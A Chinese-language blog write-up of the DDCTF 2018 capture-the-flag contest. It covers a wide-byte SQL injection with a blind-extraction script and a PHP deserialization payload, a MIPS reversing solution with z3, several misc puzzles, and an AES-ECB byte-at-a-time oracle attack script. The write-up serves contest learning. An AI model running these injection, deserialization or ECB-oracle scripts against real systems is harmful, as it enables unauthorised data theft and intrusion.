<h4 id="Web3-注入的奥妙"><a href="#Web3-注入的奥妙" class="headerlink" title="Web3 - 注入的奥妙"></a>Web3 - 注入的奥妙</h4><p>题目提示得很明显，Sql注入<br>然后进去就是一个标准的注入套路，还有注入回显</p>
<p><img src="/2018/04/21/又是一年DDCTF/11-44-20.jpg" alt=""><br>url是这种<code>http://116.85.48.105:5033/05069d93-1384-4097-a7e7-047658cacbfa/well/getmessage/1</code>，应该是经过重写的一个参数传递方式<br>测试了几个常规的payload，发现应该是用<code>addslashes</code>等函数过滤的，特殊字符加了反斜杠转义<br>由于页面提示得那么明显，我们直接尝试宽字节注入<br>这个网址挺不错的，可以将十六进制数直接变成各个编码对应的字<br><a href="http://www.qqxiuzi.cn/bianma/zifuji.php" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/zifuji.php</a></p>
<p>我们随便选几个会出现宽字节注入的编码(GBK2312不行，因为它低字节没有<code>5C</code>)<br><img src="/2018/04/21/又是一年DDCTF/12-26-22.jpg" alt=""><br>测试到BIG5编码（没做这题之前并不知道这个编码）</p>
<p><img src="/2018/04/21/又是一年DDCTF/12-27-55.jpg" alt=""></p>
<p>然后测试这样的<code>payload</code>——<code>綅&#39;or%201%23</code></p>
<p><img src="/2018/04/21/又是一年DDCTF/12-30-36.jpg" alt=""></p>
<p>发现成功转义了反斜杠，逃逸出了单引号<br>稍后我们再结合源码解释一下为什么会出现这样的效果<br>毕竟写文章是为了总结，不仅仅是为了记录姿势是吧(大佬们可以跳过此环节)<br>然后我们就可以进行常规的注入了<br>我直接拿来Web1的盲注脚本直接用了</p>
<pre><code class="lang-python"># coding:utf-8
import requests,urllib
url = &#39;http://116.85.48.105:5033/05069d93-1384-4097-a7e7-047658cacbfa/well/getmessage/1&#39;
hea = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0&quot;,
       &quot;X-forwarded-for&quot;: &quot;123.232.23.245&quot;}
payload = &quot;綅&#39;and ord(mid((select schema_name from information_schema.schemata limit {},1),{},1))&amp;{}#&quot;
#information_schema,sqli 0x73716c69

# payload = &quot;綅&#39;and ord(mid((select table_name from information_schema.tables where table_schema lilikeke 0x73716c69 limit {},1),{},1))&amp;{}#&quot;
#route_rules 0x726f7574655f72756c6573,message 0x6d657373616765
# id,pattern,action,rulepass
# payload = &quot;綅&#39;and ord(mid((select column_name from information_schema.columns where table_name lilikeke 0x6d657373616765 limit {},1),{},1))&amp;{} #&quot;
#contents,id,name
l = [1, 2, 4, 8, 16, 32, 64]
str1 = &quot;&quot;
for t in range(1000):
    str1 = &quot;&quot;
    for j in range(1, 1000):
        n = 0
        for i in l:
            payload = &quot;綅&#39;and ord(mid((select group_concat(rulepass) from sqli.route_rules limit {},1),{},1))&amp;{}#&quot;
            result = requests.get(url + urllib.quote(payload.format(t, j, i))).text
                        # print result
            if &quot;test1&quot; in result:
                n += i

        length = len(str1)
        str1 += chr(n) if n!=0 else &quot;&quot;
        print str1
        if length ==len(str1):
            break
</code></pre>
<p>得到<code>sqli.route_rules</code>表的所有信息如下</p>
<pre><code>id
1,12,13,15

rulepass
cd4229e671a8830debfcbb049a23399c,5ed16f9c7c27cb846eaf15c19fe40093,3228ad498d5a20d1d22d6a4a15fed4d2

action
Well#getmessage,JustTry#self , JustTry#try , static/bootstrap/css/backup.zip

pattern
get*/    u/well/getmessage/     s
get*/    u/justtry/self/     s
post*/    u/justtry/try     2
</code></pre><p>于是我们直接下载到了源码备份<code>static/bootstrap/css/backup.zip</code><br>注意到<code>Test</code>类<br><img src="/2018/04/21/又是一年DDCTF/14-52-38.jpg" alt=""><br><img src="/2018/04/21/又是一年DDCTF/14-53-09.jpg" alt=""><br>以及<code>Justtry</code>类的<code>try</code>方法</p>
<p><img src="/2018/04/21/又是一年DDCTF/14-54-39.jpg" alt=""></p>
<p>看得出来出题人偷懒了，直接给了我们一个提示，我们只需要构造好序列化字符串给<code>try</code>函数启动<code>Test</code>类的析构函数就能得到<code>flag</code>了</p>
<pre><code class="lang-php">&lt;?php
class Test
{
    public $user_uuid;
    public $fl;
    public function __construct()
    {
        echo &#39;hhkjjhkhjkhjkhkjhkhkhk&#39;;
    }
    public function __destruct()
    {
        $this-&gt;getflag(&#39;ctfuser&#39;, $this-&gt;user_uuid);
    }
    public function setflag($m = &#39;ctfuser&#39;, $u = &#39;default&#39;, $o = &#39;default&#39;)
    {
        $user = array(
            &#39;name&#39; =&gt; $m,
            &#39;oldid&#39; =&gt; $o,
            &#39;id&#39; =&gt; $u
        );
        echo $this-&gt;fl-&gt;set($user, 2);
    }
}
class Flag
{
    public $sql;
}
class SQL
{
}

$testzero = new Test();
$testzero-&gt;user_uuid=&quot;05069d93-1384-4097-a7e7-047658cacbfa&quot;;
$testzero-&gt;fl=new Flag();
$testzero-&gt;fl-&gt;sql = new SQL();
$serialize = serialize($testzero);
echo $serialize;

?&gt;
</code></pre>
<p>然后我们将序列化之后的字符串<code>POST</code>给<code>/justtry/try</code>目录</p>
<pre><code>hhkjjhkhjkhjkhkjhkhkhkO:4:&quot;Test&quot;:2:{s:9:&quot;user_uuid&quot;;s:36:&quot;05069d93-1384-4097-a7e7-047658cacbfa&quot;;s:2:&quot;fl&quot;;O:4:&quot;Flag&quot;:1:{s:3:&quot;sql&quot;;O:3:&quot;SQL&quot;:0:{}}}
</code></pre><p>恩，发现是没反应的</p>
<p><img src="/2018/04/21/又是一年DDCTF/17-48-08.jpg" alt=""></p>
<p>于是我再次卡了挺久，经师傅提醒才发现，类名需要带上路径，一口老血<br>修改成这个样子就好了</p>
<pre><code>O:17:&quot;Index\Helper\Test&quot;:2:{s:9:&quot;user_uuid&quot;;s:36:&quot;05069d93-1384-4097-a7e7-047658cacbfa&quot;;s:2:&quot;fl&quot;;O:17:&quot;Index\Helper\Flag&quot;:1:{s:3:&quot;sql&quot;;O:16:&quot;Index\Helper\SQL&quot;:0:{}}}
</code></pre><p>成功获取flag</p>
<p><img src="/2018/04/21/又是一年DDCTF/17-50-01.jpg" alt=""><br>宽字节注入漏洞原理 <a href="#">看这篇文章</a></p>
<h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h4 id="逆向1-MIPS"><a href="#逆向1-MIPS" class="headerlink" title="逆向1 - MIPS"></a>逆向1 - MIPS</h4><p>这题是我在web没思路期间做的，比较坑人,而且自己的姿势也不够多，导致用了笨方法，消耗了很多时间<br>题目是一个mips的elf文件，逻辑主要输你输入16个值，然后经过检验之后你输入的值就是flag，然后帮你输出<br>在ubuntu下装qemu折腾了好久才运行起来，但是无论你输入啥都会段错误<br>那肯定是加了花，但是一般加花程序也能运行，只是混淆了反编译器的反编译代码，但是这次的花把自己给加到段错误不能运行了，我是很服气的，导致我纠结了很久是不是类似于栈溢出跳转到别的地方执行之类的骚套路。事实证明他只是加花把自己加死了= =<br>先分析一下这个花</p>
<p><img src="/2018/04/21/又是一年DDCTF/20-50-39.jpg" alt=""></p>
<p>在程序检验flag的流程里，出现了这种无法指执行的指令如<code>jalx    0xDAC0BAC</code>、<code>sh      $sp, 0x2EB($t7)</code>、甚至是不是指令的垃圾数据<code>.word 0x54F102EB</code><br>但是他们都有一个共同点，就是将指令变成数据之后，他们的较低位的两字节都是<code>02EB</code></p>
<p><img src="/2018/04/21/又是一年DDCTF/20-54-20.jpg" alt=""><br>所以这题的预期解法应该是把这些较低字节为<code>02EB</code>的垃圾数据清除后再运行程序，就会很清楚地看到16个检验循环，进而得到16个等式构成一个方程组解出16个变量，即flag<br>而我就比较<del>牛逼</del>了<br>由于缺乏这种去花常识，我直接用python解析ida的代码，用自己的逻辑跳过垃圾指令，从而自己得出方程（这就是一个笨方法）<br>首先将存进栈内的256个检验变量计算出来，所以我们将IDA反汇编的代码从地址<code>0x40042C</code>到<code>0x40187C</code>复制出来放到<code>load.txt</code>，然后将地址<code>0x401880</code>到<code>0x403210</code>的代码放到<code>loop.txt</code>中，然后运行这个python脚本就好了.<br>switch=1分析load，等于0则分析loop</p>
<pre><code class="lang-python">import re

fp = [0] * 256
instructionList = [&quot;lui&quot;, &quot;sra&quot;, &quot;li&quot;, &quot;sw&quot;, &quot;lw&quot;, &quot;xori&quot;, &quot;ori&quot;, &quot;sll&quot;, &quot;negu&quot;, &quot;mul&quot;, &#39;addu&#39;, &#39;subu&#39;, &#39;beq&#39;]


def sra(v0, offset):
    t = 0
    num2bytes = bin(v0)[2:].zfill(32)
    while t &lt; offset:
        n = (0x80000000 if num2bytes[0] == &#39;1&#39; else 0)
        v0 = ((v0 &gt;&gt; 1) | n)
        t += 1
    return v0


def li(v0, immidiateNum):
    if isinstance(immidiateNum, str):
        if &#39;0x&#39; in immidiateNum:
            immidiateNum = int(immidiateNum, 16)
        else:
            immidiateNum = int(immidiateNum)
    return immidiateNum


def lui(v0, immidiateNum):
    return immidiateNum &lt;&lt; 16


def sll(v0, offset):
    return (v0 &lt;&lt; offset) &amp; 0xffffffff


def xor(v0, v1):
    return (v0 ^ v1) &amp; 0xffffffff


def ori(v0, v1):
    return (v0 | v1) &amp; 0xffffffff


def negu(v0):
    num2bytes = bin(v0)[2:].zfill(32)
    return int(&quot;&quot;.join(map(lambda x: &quot;0&quot; if x == &quot;1&quot; else &quot;1&quot;, num2bytes)), 2) + 1


def sw(v0, offset):
    if isinstance(offset, str):
        offset = int(offset, 16)
    fp[offset / 4 - 2] = v0


def lw(v0, offset):
    return fp[offset / 4 - 2]


def addiu(v0, v1):
    return (v0 + v1) &amp; 0xffffffff


def subu(v0, v1):
    return (v0 - v1) &amp; 0xffffffff


def mul(v0, v1):
    return (v0 * v1) &amp; 0xffffffff


def numeric(immidiateNum):
    if isinstance(immidiateNum, str):
        if &#39;0x&#39; in immidiateNum:
            immidiateNum = int(immidiateNum, 16)
        else:
            immidiateNum = int(immidiateNum)
    return immidiateNum


def isInstruction(line):
    try:
        if len(line) &lt; 20:
            return False
        instruction = re.findall(&quot;\.text:[0-9A-F]+\s+?([^\s]+?)\s+&quot;, line)[0]
        if instruction not in instructionList:
            return False
        return True
    except Exception, e:
        print &quot;Some wrongs occured:&quot;, e
        print &quot;The line is:&quot;, line,
        return False

v0 = 0
v1 = 0
a0 = 0

switch = 1
if switch:
    f = open(r&quot;C:\Users\windows8.Windows\Desktop\load_r.txt&quot;, &quot;r+&quot;)
else:
    f = open(r&quot;C:\Users\windows8.Windows\Desktop\loop_r.txt&quot;, &quot;r+&quot;)
lines = f.readlines()
globalV = locals()
if switch:
    for line in lines:
        if isInstruction(line):
            ins = re.findall(&quot;\.text:[0-9A-F]+\s+?([^\s]+?)\s+&quot;, line)[0]
            rd = re.findall(&quot;\.text:[0-9A-F]+\s+?[^\s]+?\s+\$(.+?),&quot;, line)[0]
            if rd not in globalV:
                print &quot;Not expect rd:&quot;, line,
                continue
            if ins == &quot;li&quot;:
                imint = re.findall(&quot;\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)&quot;, line)[0]
                globalV[rd] = li(globalV[rd], numeric(imint))

            elif ins == &quot;lui&quot;:
                try:
                    imint = re.findall(&quot;\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)&quot;, line)[0]
                    globalV[rd] = lui(globalV[rd] if globalV[rd] else 0, numeric(imint))
                except Exception, e:
                    print &quot;Can&#39;t not lui:&quot;, line, &quot;Reason:&quot;, e, &quot;.&quot;

            elif ins == &quot;sw&quot; and &quot;($fp)&quot; in line:
                try:
                    offset = re.findall(&quot;\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)&quot;, line)[0]
                except Exception, e:
                    print &quot;Exception:&quot;, e, line,
                    continue
                if offset == &quot;0x410&quot;:
                    continue
                sw(globalV[rd], numeric(offset))
            elif ins == &quot;lw&quot;:
                offset = re.findall(&quot;\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)&quot;, line)[0]
                try:
                    if offset == &quot;0x410&quot;:
                        continue
                    globalV[rd] = lw(globalV[rd], numeric(offset))
                except Exception, e:
                    print line, e
            elif ins == &quot;xori&quot;:
                offset = re.findall(&quot;\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)&quot;, line)[0]
                globalV[rd] = xor(globalV[rd], numeric(offset))
            elif ins == &quot;xor&quot;:
                print &quot;Attention:&quot;, line,
                continue
            elif ins == &quot;ori&quot;:
                offset = re.findall(&quot;\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)&quot;, line)[0]
                globalV[rd] = xor(globalV[rd], numeric(offset))
            elif ins == &#39;addi&#39; or ins == &quot;addiu&quot;:
                if ins == &#39;addi&#39;:
                    print &#39;Attention:&#39;, line,
                    continue
                offset = re.findall(&quot;\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)&quot;, line)[0]
                globalV[rd] = addiu(globalV[rd], numeric(offset))
            elif ins == &quot;subu&quot;:
                rs = re.findall(&quot;\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*\$([0-9A-Fa-z]+)&quot;, line)[0]
                if rs in globalV:
                    globalV[rd] = subu(globalV[rd], globalV[rs])
                else:
                    print &#39;Not expect rs:&#39;, line,
            elif ins == &#39;sra&#39;:
                offset = re.findall(&quot;\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)&quot;, line)[0]
                globalV[rd] = sra(globalV[rd], numeric(offset))
            elif ins == &#39;sll&#39;:
                offset = re.findall(&quot;\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)&quot;, line)[0]
                globalV[rd] = sll(globalV[rd], numeric(offset))

            elif ins == &quot;mul&quot;:
                rt = re.findall(&quot;\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*\$([0-9A-Fa-z]+)&quot;, line)[0]
                rs = re.findall(&quot;\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*\$[0-9A-Fa-z]+,\s*\$([0-9A-Fa-z]+)&quot;, line)
                if len(rs) &gt; 0:
                    rs = rs[0]

                    if rt not in globalV or rs not in globalV:
                        print &#39;Not expect rt or rs:&#39;, line,
                        continue
                    globalV[rd] = mul(globalV[rs], globalV[rt])
                else:
                    globalV[rd] = mul(globalV[rd], globalV[rt])
            elif ins == &quot;negu&quot;:
                rs = re.findall(&quot;\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*\$([0-9A-Fa-z]+)&quot;, line)[0]
                globalV[rd] = negu(globalV[rs])

            else:
                print &quot;[!]Attention:&quot;, line,
        else:
            print &quot;Skipping line:&quot;, line,
            pass
    print map(lambda x: hex(x), fp)
    print fp
else:
    n = 1
    p = []
    p_all = []
    result = []
    neguF = 0
    for line in lines:
        if isInstruction(line):
            ins = re.findall(&quot;\.text:[0-9A-F]+\s+?([^\s]+?)\s+&quot;, line)[0]
            rd = re.findall(&quot;\.text:[0-9A-F]+\s+?[^\s]+?\s+\$(.+?),&quot;, line)[0]
            if rd not in globalV:
                print &quot;Not expect rd:&quot;, line,
                continue
            if rd == &quot;v1&quot;:

                if ins == &quot;negu&quot;:
                    # TODO
                    print &quot;Loop_%d needs negu!&quot; % n
                    neguF = 1

                elif ins == &quot;beq&quot;:
                    # TODO
                    print &quot;Loop_%d end&quot; % n
                    if neguF:
                        p.insert(0, 1)
                    else:
                        p.insert(0, 0)
                    p_all.extend(p)
                    print len(p), p
                    n += 1
                    neguF = 0
                    p = []
                elif ins == &quot;subu&quot;:
                    p.append(-1)

                    print &quot;v1 -= &quot;
                elif ins == &quot;addu&quot;:
                    p.append(1)

                    print &quot;v1 += &quot;
                elif ins == &quot;mul&quot;:
                    rs = re.findall(&quot;\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*\$([0-9A-Fa-z]+)&quot;, line)[0]
                    if rs != &quot;v0&quot;:
                        print &quot;Attention:&quot;, line,
                        continue

                    print  &quot;v1 = %sv1 * v0&quot; % (&quot;~&quot; if neguF else &quot;&quot;)
                else:
                    if ins == &quot;lw&quot;:
                        continue
                    print &quot;Attention:&quot;, line,
                    pass

            if ins == &quot;li&quot; and rd == &quot;v0&quot;:
                print line
                offset = re.findall(&quot;\.text:[0-9A-F]+\s+?[^\s]+?\s+\$.+?,\s*([0-9A-Fx]+)&quot;, line)[0]
                print &quot;Result:&quot;, offset
                result.append(numeric(offset))
        else:
            # print &quot;Skipping line:&quot;, line,
            pass
    print &quot;\nResult:&quot;, result
    print &quot;num:&quot;, p_all
f.close()
</code></pre>
<p>然后将得到的fp数组，result数组和num数组放进这个脚本里面用z3解释器求方程组的解就是了</p>
<pre><code class="lang-python">from z3 import *


def negu(v0):
    num2bytes = bin(v0)[2:].zfill(32)
    return int(&quot;&quot;.join(map(lambda x: &quot;0&quot; if x == &quot;1&quot; else &quot;1&quot;, num2bytes)), 2) + 1

fp = []
result =[]
p = []#num
equation = []
for i in range(len(p) / 16):
    a = p[i * 16:(i + 1) * 16]
    b = fp[i * 16:(i + 1) * 16]
    if a[0]:
        b[0] = negu(b[0])
    else:
        a[0] = 1
    d = map(lambda (a, b): a * b, zip(a, b))
    s = &quot;&quot;
    for t in range(16):
        print (&quot;+&quot; if d[t] &gt; 0 and t != 0 else &quot;&quot;) + str(hex(d[t])) + &quot;*&quot; + &quot;a[&quot; + str(t) + &quot;]&quot;,
        s += (&quot;+&quot; if d[t] &gt; 0 and t != 0 else &quot;&quot;) + str(hex(d[t])) + &quot;*&quot; + &quot;a[&quot; + str(t) + &quot;]&quot;
    print &quot; = &quot; + hex(result[i])
    s += &quot; == &quot; + hex(result[i])
    equation.append(s)
a = [BitVec(&quot;flag_%d&quot; % i, 32) for i in range(16)]
so = Solver()
for i in equation:
    so.add(eval(i))
print(so.check())
print(so.model())
</code></pre>
<p>由于数有点大，大概需要1分钟的样子解出答案</p>
<p><img src="/2018/04/21/又是一年DDCTF/21-53-59.jpg" alt=""></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="Misc2-╯°□°）╯︵-┻━┻"><a href="#Misc2-╯°□°）╯︵-┻━┻" class="headerlink" title="Misc2 - (╯°□°）╯︵ ┻━┻"></a>Misc2 - (╯°□°）╯︵ ┻━┻</h4><p>每个字符的ASCLL码都加了128，去掉就好了</p>
<pre><code class="lang-python">c = &quot;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb7b9b8e4b5b5e4e2b7b6b5b5b2e1b9b2b2e4b0b0e4b7b7b5e5b3b3b1b1b9b0b7fd&quot;
flag = &quot;&quot;
for i in range(len(c) / 2):
    flag += chr(int(c[i * 2:(i + 1) * 2], 16) &amp; 0x7f)
print flag
#That was fast! The flag is: DDCTF{798d55db76552a922d00d775e3311907}
</code></pre>
<h4 id="Misc4-第四扩展FS"><a href="#Misc4-第四扩展FS" class="headerlink" title="Misc4 - 第四扩展FS"></a>Misc4 - 第四扩展FS</h4><p>一张windows.jpg，属性部分存在密码备注，图片里面存在ZIP的文件头PK，用winhex提取出zip</p>
<p><img src="/2018/04/21/又是一年DDCTF/22-05-38.jpg" alt=""><br>file.txt是一个充满字符的txt</p>
<p><img src="/2018/04/21/又是一年DDCTF/22-05-46.jpg" alt=""><br><img src="/2018/04/21/又是一年DDCTF/22-06-02.jpg" alt=""><br>很容易联想到字频统计之类的攻击<br>使用TextDecoder Toolkit这个工具进行字符统计<br>下载地址：<a href="http://www.kahusecurity.com/?page_id=13485" target="_blank" rel="noopener">http://www.kahusecurity.com/?page_id=13485</a>，解压密码kahusecurity</p>
<p><img src="/2018/04/21/又是一年DDCTF/22-07-11.jpg" alt=""><br>得到flag</p>
<h4 id="Misc3-流量分析"><a href="#Misc3-流量分析" class="headerlink" title="Misc3 - 流量分析"></a>Misc3 - 流量分析</h4><p>包里面用ftp传了sqlmap.zip和Fl-g.zip，后来才发现是陷阱(巨坑)<br>包里面的smtp里面传了一些无关紧要的东西，一些网页，一些对话，还有一张大图image001.png</p>
<p><img src="/2018/04/21/又是一年DDCTF/22-08-49.png" alt=""><br>然后将图片的base64编码提取出来，写进我们写的html文件</p>
<pre><code class="lang-html">&lt;img src=&quot;data:image/png;base64,xxxxxx(ImageBase64)”&gt;
</code></pre>
<p>得到</p>
<p><img src="/2018/04/21/又是一年DDCTF/22-09-27.jpg" alt=""></p>
<p>通过提示很容易知道是一个RSA密钥的base64编码<br>随后在wireshark中搜索ssl协议流量，发现172.17.0.3与172.17.0.2之间有ssl通信<br>猜测图片中的密钥是其中一方的私钥</p>
<p><img src="/2018/04/21/又是一年DDCTF/22-09-48.jpg" alt=""><br>将图片的密钥变成标准格式(机器OCR+人眼OCR)</p>
<p><img src="/2018/04/21/又是一年DDCTF/22-09-56.jpg" alt=""></p>
<p>将密钥导进wireshark，编辑 -&gt; 首选项 -&gt; protocols -&gt; SSL -&gt; RSA keys list Edit</p>
<p><img src="/2018/04/21/又是一年DDCTF/22-14-23.jpg" alt=""><br>然后在ssl流量中发现解密出来的flag</p>
<p><img src="/2018/04/21/又是一年DDCTF/22-14-51.jpg" alt=""></p>
<h4 id="Misc5-安全通信"><a href="#Misc5-安全通信" class="headerlink" title="Misc5 - 安全通信"></a>Misc5 - 安全通信</h4><p>这题比较快地写了出来，google找到一篇github的文章，刚好是对应的类型，然后写了个脚本就好了，文章地址： <a href="https://github.com/liamh95/CTF-writeups/tree/master/CSAW17/baby_crypt" target="_blank" rel="noopener">https://github.com/liamh95/CTF-writeups/tree/master/CSAW17/baby_crypt</a><br>题的代码如下</p>
<pre><code class="lang-python">#!/usr/bin/env python
import sys
import json
from Crypto.Cipher import AES
from Crypto import Random

def get_padding(rawstr):
    remainder = len(rawstr) % 16
    if remainder != 0:
        return &#39;\x00&#39; * (16 - remainder)
    return &#39;&#39;

def aes_encrypt(key, plaintext):
    plaintext += get_padding(plaintext)
    aes = AES.new(key, AES.MODE_ECB)
    cipher_text = aes.encrypt(plaintext).encode(&#39;hex&#39;)
    return cipher_text

def generate_hello(key, name, flag):
    message = &quot;Connection for mission: {}, your mission&#39;s flag is: {}&quot;.format(name, flag)
    return aes_encrypt(key, message)

def get_input():
    return raw_input()

def print_output(message):
    print(message)
    sys.stdout.flush()

def handle():
    print_output(&quot;Please enter mission key:&quot;)
    mission_key = get_input().rstrip()
    print_output(&quot;Please enter your Agent ID to secure communications:&quot;)
    agentid = get_input().rstrip()
    rnd = Random.new()
    session_key = rnd.read(16)
    flag = &#39;&lt;secret&gt;&#39;
    print_output(generate_hello(session_key, agentid, flag))
    while True:
        print_output(&quot;Please send some messages to be encrypted, &#39;quit&#39; to exit:&quot;)
        msg = get_input().rstrip()
        if msg == &#39;quit&#39;:
            print_output(&quot;Bye!&quot;)
            break
        enc = aes_encrypt(session_key, msg)
        print_output(enc)

if __name__ == &quot;__main__&quot;:
    handle()
</code></pre>
<p>代码大致意思是首先生成一个对话的随机key，然后用AES的ECB(Electronic codebook)模式将一段嵌入<code>agent id</code>和<code>flag</code>的<code>message</code>进行加密，密钥就是随机的key，然后输出加密的结果<br>接下来是一个循环，继续利用刚才的密钥对我们接下来输入的信息进行加密然后输出结果<br>ECB加密是分组进行加密的，解密也是分组解密。分组与分组之间的明文产生的密文互相独立，且由于算法的缘故，相同的明文分组在相同的密钥加密下会产生相同的密文<br>加解密流程如下图所示</p>
<blockquote>
<p>引用自维基百科<br><img src="/2018/04/21/又是一年DDCTF/22-50-28_1.jpg" alt=""></p>
<p><img src="/2018/04/21/又是一年DDCTF/22-50-56_1.jpg" alt=""></p>
</blockquote>
<p>而我们要做的事是通过这些个分组且明文加密固定密文的特性猜出flag的每一位来<br>题中以16字节为一组，我们举例也拿16字节为一组举例<br>首先我们假设<code>xxxx</code>使我们可控的输入，一般情况下的加密会是这样的</p>
<p><img src="/2018/04/21/又是一年DDCTF/ECB1_1.png" alt=""></p>
<p>但是如果我们控制<code>xxx</code>为十五个固定的字符如十五个<code>A</code><br>则加密过程会变成这样：</p>
<p><img src="/2018/04/21/又是一年DDCTF/ECB2_1.png" alt=""></p>
<p>现在我们记录下此时的<code>HEX_1</code><br>然后再通过Fuzz的方法让同样的密钥对我们特定的分组进行加密，如</p>
<pre><code>AAAAAAAAAAAAAAAa
AAAAAAAAAAAAAAAb
AAAAAAAAAAAAAAAc
AAAAAAAAAAAAAAAd
....
AAAAAAAAAAAAAAA*
</code></pre><p>然后将这些加密后的<code>HEX</code>与<code>HEX_1</code>进行比较，加密后的密文相同则说明明文相同，所以我们可以猜测出<code>Flag</code>的第一位是<code>F</code><br>然后依次类推，推导出所有的字节就好了<br>然后回到我们这题<br>flag共39位，可以通过测试id逐字节加再观察加密后的HEX长度得到<br>利用python的pwntools库完成和远程程序交互</p>
<pre><code class="lang-python">from pwn import *
import string

# context.log_level = &#39;debug&#39;
def respone(recv_buf, send_buf, new_line=True):
    pro.recvuntil(recv_buf)
    if new_line:
        pro.sendline(send_buf)
    else:
        pro.send(send_buf)

flag = &quot;&quot;
while 1:
    pro = remote(&quot;116.85.48.103&quot;, 5002)
    respone(&quot;mission key:\n&quot;, &quot;You_session_key&quot;)

    payload = (45 - len(flag)) * &quot;1&quot;
    respone(&quot;communications:\n&quot;, payload)
    c = pro.recvuntil(&#39;\n&#39;, drop=True)[160:160 + 32]

    for i in string.printable:
        message = &quot;Connection for mission: {}, your mission&#39;s flag is: {}&quot;.format(payload, flag + i)
        respone(&quot;exit:\n&quot;, message)
        m = pro.recvuntil(&#39;\n&#39;, drop=True)[-32:]
        if c == m:
            log.info(&quot;Find char: %s&quot;, i)
            flag += i
            break
    pro.close()
    log.info(&quot;Flag: %s&quot;, flag)
    sleep(1)
</code></pre>
<p><img src="/2018/04/21/又是一年DDCTF/23-30-06.jpg" alt=""></p>
<h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>比赛过程挺刺激的，依旧持续了一个星期之久<br>最后也是混了个22名吧<br>一年过去了，依旧那么菜<br>希望下一年自己能够找到自己真正喜欢的领域去深入研究吧</p>
<p><img src="/2018/04/21/又是一年DDCTF/23-37-22.jpg" alt=""></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>T3stzer0</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://www.testzero-wz.com/2018/04/21/又是一年DDCTF/">https://www.testzero-wz.com/2018/04/21/又是一年DDCTF/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tag/CTF/"># CTF</a>
                    
                        <a href="/tag/WriteUp/"># WriteUp</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2018/07/08/春招随笔/">春招随笔</a>
            
            
            <a class="next" rel="next" href="/2018/04/06/写一个ARP欺骗的命令行工具/">写一个ARP欺骗的命令行工具</a>
            
        </section>


    </article>
</div>

        </div>
        <!-- 
<footer id="footer" class="footer">
    <div class="copyright">
        <span>© T3stzer0 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

-->
<script src="/js/highlight.min.js"></script>
<script>hljs.highlightAll();</script>

    </div>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
</body>
</html>
